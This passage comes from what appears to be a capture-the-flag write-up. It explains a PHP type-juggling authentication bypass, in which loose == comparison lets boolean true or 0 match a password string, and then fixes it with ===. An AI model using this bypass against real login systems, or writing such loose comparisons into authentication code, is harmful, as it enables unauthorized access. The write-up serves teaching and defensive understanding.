php > if ("password" == "UHC-March-Global-PW!") {echo "Authenticated";} else {echo "Rejected!";};
Rejected!

```

Now I’ll try replacing `"password"` with the string `"true"`. It still fails:

```

php > if ("true" == "UHC-March-Global-PW!") {echo "Authenticated";} else {echo "Rejected!";};
Rejected!

```

But if I make that `true`, it works:

```

php > if (true == "UHC-March-Global-PW!") {echo "Authenticated";} else {echo "Rejected!";};
Authenticated

```

When PHP compares two objects of different types for comparison using the equal operator (`==`), it does a thing called “type juggling” to try to get them to the same type, and then compares them. There’s an awesome chart from [this 2015 OWASP presentation](https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf):

![image-20220312143447181](https://0xdfimages.gitlab.io/img/image-20220312143447181.png)

The case here is `true` vs `"php"`, which resolves to `true`. According to this chart, I could have also passed in the number 0 (for some reason). It does work:

[![image-20220312143623688](https://0xdfimages.gitlab.io/img/image-20220312143623688.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220312143623688.png)

It’s interesting that all other numbers fail here.

#### Fix Vulnerability

To fix this vulnerability, PHP’s [list of comparison operators](https://www.php.net/manual/en/language.operators.comparison.php) gives `===`, the identical operator. This checks that the two things are equal *and* that they are the same type.

I’ll update that in the code on Ransom, and now the auth bypass doesn’t work anymore:

[![image-20220312144012777](https://0xdfimages.gitlab.io/img/image-20220312144012777.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220312144012777.png)

The correct password still does:

[![image-20220312144045656](https://0xdfimages.gitlab.io/img/image-20220312144045656.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/image-20220312144045656.png)